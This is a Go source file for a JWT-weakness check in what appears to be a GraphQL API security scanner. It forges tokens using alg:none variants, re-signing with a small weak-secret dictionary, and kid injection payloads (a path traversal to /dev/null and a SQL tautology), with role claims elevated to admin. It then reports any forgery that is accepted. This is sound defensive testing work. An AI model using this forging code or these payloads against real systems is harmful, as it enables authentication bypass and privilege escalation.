package checks

import (
	"bytes"
	"context"
	"crypto/hmac"
	"crypto/sha256"
	"crypto/sha512"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"hash"
	"net/http"
	"sort"
	"strings"
	"time"

	"github.com/gqls-cli/gqls/pkg/scanner/authz"
	"github.com/gqls-cli/gqls/pkg/schema"
	"github.com/gqls-cli/gqls/pkg/transport"
)

// jwtWeaknessCheck implements GQL-A08: JWT authentication-token weaknesses. It
// inspects and tamper-tests the JWT bearer token the operator supplied for
// classic verification flaws — alg:none acceptance, weak HMAC secret, missing
// exp, and kid injection.
type jwtWeaknessCheck struct{}

func init() {
	MustRegister(&jwtWeaknessCheck{})
}

func (c *jwtWeaknessCheck) ID() string           { return "GQL-A08" }
func (c *jwtWeaknessCheck) Name() string         { return "JWT Authentication-Token Weaknesses" }
func (c *jwtWeaknessCheck) Category() Category   { return Authorization }
func (c *jwtWeaknessCheck) Severity() Severity   { return HIGH }
func (c *jwtWeaknessCheck) RequiresSchema() bool { return false }

// algNoneVariants are the casings tried against libraries that only string-match "none".
var algNoneVariants = []string{"none", "None", "NONE", "nOnE"}

// jwtWeakSecrets is a tiny dictionary of common HMAC secrets (for detection, not
// exhaustive cracking). Kept small so the total probe budget stays bounded.
var jwtWeakSecrets = []string{"secret", "password", "changeme", "jwt", "key", "admin", "your-256-bit-secret", ""}

// kidInjectionPayloads are values tried in the kid header for path/SQL trickery.
var kidInjectionPayloads = []string{"../../../../dev/null", "' OR '1'='1"}

// oversizedExp is the lifetime above which a token's exp is flagged as hygiene risk.
const oversizedExp = 365 * 24 * time.Hour

// Run executes the JWT weakness check.
func (c *jwtWeaknessCheck) Run(ctx context.Context, cc *CheckContext) (CheckResult, error) {
	result := CheckResult{CheckID: c.ID(), Ran: true}

	genuine, header, payload, ok := extractJWT(cc)
	if !ok {
		result.Ran = false
		result.Skipped = true
		result.SkipReason = "no JWT bearer token supplied; provide one via --header 'Authorization: Bearer <jwt>' " +
			"or --identity to run JWT checks"
		return result, nil
	}

	client := bareAuthClient(cc)
	opDoc := chooseAuthOp(cc.Schema)

	// ── Baseline + negative control to establish that the operation is auth-gated.
	genuineResp, _, gerr := sendWithAuth(ctx, client, cc.Target, opDoc, "Bearer "+genuine)
	result.ProbeCount++
	garbageResp, _, _ := sendWithAuth(ctx, client, cc.Target, opDoc, "Bearer invalid.invalid.invalid")
	result.ProbeCount++

	genuineClass := authz.Class(authz.ClassUnknown)
	if gerr == nil {
		genuineClass = authz.Classify(genuineResp)
	}
	authGated := genuineClass == authz.ClassSuccess && garbageResp != nil &&
		authz.Classify(garbageResp) == authz.ClassAuthDenied

	alg, _ := header["alg"].(string)
	var passProbes []PassProbe

	// ── Forge-acceptance tests (only meaningful when the op is auth-gated) ─────
	if authGated {
		if fin, pp, found := c.tryForgeries(ctx, cc, client, opDoc, header, payload, alg, &result); found {
			result.Findings = append(result.Findings, fin)
		} else {
			passProbes = append(passProbes, pp...)
		}
	} else {
		passProbes = append(passProbes, PassProbe{
			Label: "JWT forge-acceptance tests skipped: the probe operation is not auth-gated " +
				"(a garbage token was not rejected), so forged-token acceptance cannot be distinguished",
		})
	}

	// ── exp hygiene (passive analysis of the supplied token) ──────────────────
	if expFinding, ok := c.checkExp(cc, header, payload); ok {
		result.Findings = append(result.Findings, expFinding)
	}

	if len(result.Findings) > 0 {
		return result, nil
	}

	result.PassProbes = passProbes
	if !authGated {
		result.PassReason = "could not establish an auth-gated baseline (genuine token not accepted, or the " +
			"probe operation is public); JWT tamper acceptance could not be assessed"
	} else {
		result.PassReason = "the supplied JWT was rejected for every tamper variant (alg:none, weak-secret " +
			"re-signing, kid injection) and its exp claim is present and bounded; signature verification appears correct"
	}
	return result, nil
}

// tryForgeries sends the forged-token variants in priority order and returns a
// finding for the first one accepted.
func (c *jwtWeaknessCheck) tryForgeries(ctx context.Context, cc *CheckContext, client *transport.Client,
	opDoc string, header, payload map[string]interface{}, alg string, result *CheckResult) (Finding, []PassProbe, bool) {

	elevated := elevatedPayload(payload)
	var pp []PassProbe

	// 1. alg:none (and casing variants).
	for _, variant := range algNoneVariants {
		tok := buildJWT(header, elevated, "", variant)
		resp, body, err := sendWithAuth(ctx, client, cc.Target, opDoc, "Bearer "+tok)
		result.ProbeCount++
		if err == nil && authz.Classify(resp) == authz.ClassSuccess {
			return c.forgeFinding(cc, "alg-none", fmt.Sprintf("a forged token with header alg=%q and an empty "+
				"signature was accepted as authenticated", variant), "confirmed", header, payload, resp, body), pp, true
		}
	}

	// 2. weak HMAC secret (only for HMAC-signed tokens).
	if isHMAC(alg) {
		for _, secret := range jwtWeakSecrets {
			tok := buildJWT(header, elevated, secret, alg)
			resp, body, err := sendWithAuth(ctx, client, cc.Target, opDoc, "Bearer "+tok)
			result.ProbeCount++
			if err == nil && authz.Classify(resp) == authz.ClassSuccess {
				return c.forgeFinding(cc, "weak-secret", fmt.Sprintf("the token was accepted after re-signing "+
					"with the weak/guessable HMAC secret %q", secret), "confirmed", header, payload, resp, body), pp, true
			}
		}
	}

	// 3. kid injection (best-effort, lower confidence).
	if _, hasKid := header["kid"]; hasKid {
		for _, inj := range kidInjectionPayloads {
			forgedHeader := cloneMap(header)
			forgedHeader["kid"] = inj
			signAlg := alg
			if !isHMAC(signAlg) {
				signAlg = "HS256"
			}
			tok := buildJWT(forgedHeader, elevated, "", signAlg) // empty key (e.g. kid → /dev/null)
			resp, body, err := sendWithAuth(ctx, client, cc.Target, opDoc, "Bearer "+tok)
			result.ProbeCount++
			if err == nil && authz.Classify(resp) == authz.ClassSuccess {
				return c.forgeFinding(cc, "kid-injection", "a forged token with an injected kid header value and "+
					"an empty signing key was accepted", "firm", header, payload, resp, body), pp, true
			}
		}
	}

	pp = append(pp, PassProbe{Label: "all JWT tamper variants (alg:none, weak-secret, kid) were rejected"})
	return Finding{}, pp, false
}

// checkExp returns a token-hygiene finding when exp is missing or far in the future.
func (c *jwtWeaknessCheck) checkExp(cc *CheckContext, header, payload map[string]interface{}) (Finding, bool) {
	expRaw, present := payload["exp"]
	if !present {
		return c.forgeFinding(cc, "missing-exp", "the supplied token has no exp (expiry) claim, so it never "+
			"expires once issued", "firm", header, payload, nil, nil), true
	}
	if expF, ok := expRaw.(float64); ok {
		expTime := time.Unix(int64(expF), 0)
		if time.Until(expTime) > oversizedExp {
			return c.forgeFinding(cc, "oversized-exp", fmt.Sprintf("the supplied token's exp is more than a year "+
				"in the future (expires %s), an excessive lifetime", expTime.UTC().Format("2006-01-02")),
				"firm", header, payload, nil, nil), true
		}
	}
	return Finding{}, false
}

// forgeFinding builds a JWT-weakness finding. It never includes the raw token or
// signature — only the weakness, the decoded alg/kid, and the claim key names.
func (c *jwtWeaknessCheck) forgeFinding(cc *CheckContext, weakness, detail, confidence string,
	header, payload map[string]interface{}, resp *transport.Response, body []byte) Finding {

	title := map[string]string{
		"alg-none":      "alg:none accepted",
		"weak-secret":   "weak HMAC secret",
		"kid-injection": "kid header injection",
		"missing-exp":   "missing exp (expiry) claim",
		"oversized-exp": "excessive token lifetime",
	}[weakness]

	f := Finding{
		CheckID:   c.ID(),
		CheckName: c.Name(),
		Severity:  HIGH,
		Category:  Authorization,
		Title:     "JWT Verification Weakness — " + title,
		Description: fmt.Sprintf("%s. Decoded token header: %s; claims present: [%s]. "+
			"(The raw token and signature are never logged.)",
			detail, headerSummary(header), strings.Join(claimKeys(payload), ", ")),
		Impact: "An attacker can forge valid authentication tokens for arbitrary users or roles (including " +
			"admin), achieving full authentication bypass and privilege escalation against the GraphQL API.",
		Remediation: "Reject alg:none and enforce an allow-list of strong algorithms; use a high-entropy " +
			"secret or proper asymmetric keys (never a dictionary word); validate exp/nbf/iat and keep token " +
			"lifetimes short; validate/whitelist kid against known keys and never use it to load keys from " +
			"untrusted paths; rotate keys.",
		References: []string{
			"https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html",
			"https://owasp.org/API-Security/editions/2023/en/0xa2-broken-authentication/",
			"https://cwe.mitre.org/data/definitions/347.html",
		},
		Confidence:   confidence,
		CWE:          "CWE-347",
		OWASP:        "API2:2023",
		Fingerprint:  GenerateFingerprint(c.ID(), cc.Target, "jwt:"+weakness),
		ReproRequest: nil,
		ReproBody:    body,
	}
	if resp != nil {
		f.ReproRequest = resp.Request
	}
	return f
}

// ── token extraction / decoding ──────────────────────────────────────────────

// extractJWT finds a JWT bearer token in the configured headers (identities →
// resolved headers → curl headers) and decodes its header and payload.
func extractJWT(cc *CheckContext) (token string, header, payload map[string]interface{}, ok bool) {
	var candidates []string
	for _, id := range cc.Identities {
		if a := ciHeaderGet(id.Headers, "Authorization"); a != "" {
			candidates = append(candidates, a)
		}
	}
	if a := ciHeaderGet(cc.Headers, "Authorization"); a != "" {
		candidates = append(candidates, a)
	}
	if cc.ParsedCurl != nil {
		if a := ciHeaderGet(cc.ParsedCurl.Headers, "Authorization"); a != "" {
			candidates = append(candidates, a)
		}
	}
	for _, a := range candidates {
		tok := a
		if len(a) >= 7 && strings.EqualFold(a[:7], "bearer ") {
			tok = strings.TrimSpace(a[7:])
		}
		if h, p, decoded := decodeJWT(tok); decoded {
			return tok, h, p, true
		}
	}
	return "", nil, nil, false
}

// decodeJWT splits and base64url-decodes a JWT's header and payload (no
// signature verification). A token must have three segments and a JSON header
// carrying an "alg".
func decodeJWT(token string) (header, payload map[string]interface{}, ok bool) {
	parts := strings.Split(token, ".")
	if len(parts) != 3 {
		return nil, nil, false
	}
	hb, herr := b64uDecode(parts[0])
	pb, perr := b64uDecode(parts[1])
	if herr != nil || perr != nil {
		return nil, nil, false
	}
	if json.Unmarshal(hb, &header) != nil || json.Unmarshal(pb, &payload) != nil {
		return nil, nil, false
	}
	if header == nil || header["alg"] == nil {
		return nil, nil, false
	}
	return header, payload, true
}

// ── JWT building / signing ───────────────────────────────────────────────────

// buildJWT encodes a JWT with the given header/payload, forcing the alg, and
// signs it with secret using HMAC (or leaves an empty signature for alg:none).
func buildJWT(header, payload map[string]interface{}, secret, alg string) string {
	h := cloneMap(header)
	h["alg"] = alg
	if h["typ"] == nil {
		h["typ"] = "JWT"
	}
	input := b64uJSON(h) + "." + b64uJSON(payload)
	if strings.EqualFold(alg, "none") {
		return input + "."
	}
	if sig, ok := hmacSign(input, secret, alg); ok {
		return input + "." + sig
	}
	return input + "."
}

// hmacSign signs the input with the given HMAC algorithm, returning the
// base64url signature.
func hmacSign(input, secret, alg string) (string, bool) {
	var newHash func() hash.Hash
	switch strings.ToUpper(alg) {
	case "HS256":
		newHash = sha256.New
	case "HS384":
		newHash = sha512.New384
	case "HS512":
		newHash = sha512.New
	default:
		return "", false
	}
	mac := hmac.New(newHash, []byte(secret))
	mac.Write([]byte(input))
	return base64.RawURLEncoding.EncodeToString(mac.Sum(nil)), true
}

func isHMAC(alg string) bool {
	switch strings.ToUpper(alg) {
	case "HS256", "HS384", "HS512":
		return true
	}
	return false
}

// ── small helpers ────────────────────────────────────────────────────────────

func b64uJSON(v interface{}) string {
	b, _ := json.Marshal(v)
	return base64.RawURLEncoding.EncodeToString(b)
}

func b64uDecode(s string) ([]byte, error) {
	if b, err := base64.RawURLEncoding.DecodeString(s); err == nil {
		return b, nil
	}
	return base64.URLEncoding.DecodeString(s)
}

func cloneMap(m map[string]interface{}) map[string]interface{} {
	out := make(map[string]interface{}, len(m))
	for k, v := range m {
		out[k] = v
	}
	return out
}

// elevatedPayload returns a copy of the payload with common role claims bumped,
// keeping the forged token benign but "useful" if accepted.
func elevatedPayload(payload map[string]interface{}) map[string]interface{} {
	p := cloneMap(payload)
	for _, k := range []string{"role", "isAdmin", "is_admin", "admin", "is_superuser"} {
		if _, ok := p[k]; ok {
			if k == "role" {
				p[k] = "admin"
			} else {
				p[k] = true
			}
		}
	}
	return p
}

func claimKeys(payload map[string]interface{}) []string {
	keys := make([]string, 0, len(payload))
	for k := range payload {
		keys = append(keys, k)
	}
	sort.Strings(keys)
	return keys
}

func headerSummary(header map[string]interface{}) string {
	alg, _ := header["alg"].(string)
	s := "alg=" + alg
	if kid, ok := header["kid"].(string); ok {
		s += ", kid present"
		_ = kid
	}
	return s
}

// ciHeaderGet does a case-insensitive lookup in a header map.
func ciHeaderGet(m map[string]string, key string) string {
	if m == nil {
		return ""
	}
	if v, ok := m[key]; ok {
		return v
	}
	for k, v := range m {
		if strings.EqualFold(k, key) {
			return v
		}
	}
	return ""
}

// bareAuthClient returns a client with no default Authorization header, so the
// check can set a forged Authorization per request without it being overridden.
func bareAuthClient(cc *CheckContext) *transport.Client {
	if cc.UnauthenticatedClient != nil {
		return cc.UnauthenticatedClient
	}
	return transport.NewClient(30*time.Second, 50, nil)
}

// chooseAuthOp prefers an auth-gated viewer query when the schema exposes one,
// falling back to __typename (paired with the garbage-token negative control).
func chooseAuthOp(s *schema.Schema) string {
	if s != nil {
		for _, f := range s.QueryFields() {
			if f != nil && viewerFieldRe.MatchString(f.Name) {
				return fmt.Sprintf("query { %s { __typename } }", f.Name)
			}
		}
	}
	return "{ __typename }"
}

// sendWithAuth issues a POST application/json GraphQL request with the given
// Authorization header value.
func sendWithAuth(ctx context.Context, client *transport.Client, target, query, authValue string) (*transport.Response, []byte, error) {
	body, err := json.Marshal(map[string]string{"query": query})
	if err != nil {
		return nil, nil, err
	}
	if client == nil {
		return nil, body, fmt.Errorf("nil client")
	}
	req, err := http.NewRequestWithContext(ctx, http.MethodPost, target, bytes.NewReader(body))
	if err != nil {
		return nil, body, err
	}
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("Accept-Encoding", "identity")
	req.Header.Set("Authorization", authValue)
	resp, err := client.Do(req)
	if err != nil {
		return nil, body, err
	}
	return resp, body, nil
}
